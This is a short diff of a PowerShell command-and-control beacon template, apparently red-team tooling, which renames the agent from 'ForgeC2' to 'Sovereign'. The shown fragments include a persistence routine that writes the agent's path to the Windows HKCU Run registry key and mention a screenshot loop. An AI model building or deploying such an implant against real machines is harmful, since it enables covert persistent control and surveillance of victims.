@@ -1,5 +1,5 @@
 <#
-ForgeC2 PowerShell Agent
+Sovereign PowerShell Agent
 Professional single-file beacon for authorized red team operations.
 This is the full-featured template. Config is injected by the generator (Generate page only).
 Do NOT run this file directly — use the C2 Generate Agent feature.
@@ -68,7 +68,7 @@ function Add-Persistence {
         $exePath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
         if ($exePath -notlike "*.ps1") {
             $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-            Set-ItemProperty -Path $regPath -Name "ForgeC2" -Value $exePath -ErrorAction SilentlyContinue
+            Set-ItemProperty -Path $regPath -Name "Sovereign" -Value $exePath -ErrorAction SilentlyContinue
         }
     } catch {}
 }
@@ -574,12 +574,12 @@ function Continue-Screenshot-Loop {
 
 # ============ MAIN ============
 if ($global:Debug) {
-    Write-Host "[ForgeC2] PowerShell Agent starting..." -ForegroundColor Cyan
+    Write-Host "[Sovereign] PowerShell Agent starting..." -ForegroundColor Cyan
 }
 
 Add-Persistence
 
-$uuidFile = Join-Path $env:TEMP "forgec2_uuid.txt"
+$uuidFile = Join-Path $env:TEMP "sovereign_uuid.txt"
 if (Test-Path $uuidFile) { 
     $global:AgentUUID = [IO.File]::ReadAllText($uuidFile).Trim() 
 } else { 
